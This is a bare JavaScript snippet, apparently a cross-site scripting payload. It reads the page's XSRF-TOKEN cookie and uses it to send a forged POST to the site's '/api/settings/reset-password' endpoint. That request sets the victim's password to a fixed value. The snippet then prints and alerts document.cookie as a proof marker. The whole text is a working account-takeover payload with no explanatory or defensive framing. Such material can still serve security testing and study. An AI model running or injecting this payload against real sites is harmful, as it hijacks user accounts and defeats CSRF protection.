let t = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
if(t){
  fetch('/api/settings/reset-password', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Xsrf-Token': decodeURIComponent(t[1])
    },
    body: JSON.stringify("P@ssw0rd")
  });
}

console.log("Cookies:", document.cookie);
alert("Cookies: " + document.cookie);
